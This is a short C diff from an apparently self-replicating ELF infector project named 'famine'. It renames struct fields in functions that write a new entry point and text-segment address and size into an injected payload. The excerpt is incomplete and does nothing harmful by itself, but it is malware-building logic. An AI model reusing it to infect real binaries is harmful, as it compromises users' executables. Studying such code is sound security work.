@@ -75,8 +75,8 @@ void overwrite_payload_gettextsectionaddr(t_famine *famine)
         memcpy(famine->payload_data + gettextsectionaddr_offset + 1, (void *)(&(gettextsectionaddr_offset)), 4);
         // Rewrite new entry_point in payload gettextsectionaddr.
         memcpy(famine->payload_data + gettextsectionaddr_offset + 6, (void *)&(famine->new_entry_point), 4);
-        // Rewrite famine->text_p_vaddr.
-        memcpy(famine->payload_data + gettextsectionaddr_offset + 11, (void *)&(famine->text_p_vaddr), 4);
+        // Rewrite famine->p_text_vaddr.
+        memcpy(famine->payload_data + gettextsectionaddr_offset + 11, (void *)&(famine->p_text_vaddr), 4);
     }
     else if (ARCH_64)
     {
@@ -85,8 +85,8 @@ void overwrite_payload_gettextsectionaddr(t_famine *famine)
         memcpy(famine->payload_data + gettextsectionaddr_offset + 2, (void *)(&(gettextsectionaddr_offset)), 4);
         // Rewrite new entry_point in payload gettextsectionaddr.
         memcpy(famine->payload_data + gettextsectionaddr_offset + 8, (void *)&(famine->new_entry_point), 4);
-        // Rewrite famine->text_p_vaddr.
-        memcpy(famine->payload_data + gettextsectionaddr_offset + 14, (void *)&(famine->text_p_vaddr), 4);
+        // Rewrite famine->p_text_vaddr.
+        memcpy(famine->payload_data + gettextsectionaddr_offset + 14, (void *)&(famine->p_text_vaddr), 4);
     }
 }
 
@@ -116,13 +116,13 @@ void overwrite_payload_gettextsize(t_famine *famine)
     {
         gettextsize_offset = find_gettextsize_offset_elf32(famine);
         // Rewrite gettextsize_offset + 2 to skip two first instructions and go to textsize value.
-        memcpy(famine->payload_data + gettextsize_offset + 2, (void *)&(famine->text_p_size), 4);
+        memcpy(famine->payload_data + gettextsize_offset + 2, (void *)&(famine->p_text_size), 4);
     }
     else if (ARCH_64)
     {
         gettextsize_offset = find_gettextsize_offset_elf64(famine);
         // Rewrite gettextsize_offset + 2 to skip two first instructions and go to textsize value.
-        memcpy(famine->payload_data + gettextsize_offset + 2, (void *)&(famine->text_p_size), 4);
+        memcpy(famine->payload_data + gettextsize_offset + 2, (void *)&(famine->p_text_size), 4);
     }
 }
 
